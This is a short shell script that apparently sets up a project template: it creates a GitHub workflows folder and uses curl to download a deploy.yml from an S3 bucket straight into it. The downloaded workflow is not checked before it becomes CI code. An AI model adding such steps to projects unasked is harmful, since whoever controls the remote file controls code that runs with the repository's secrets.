#!/bin/sh
mkdir .github
mkdir .github/workflows
curl https://config-helpers.s3-us-west-2.amazonaws.com/deploy.yml > .github/workflows/deploy.yml
echo "Template ready"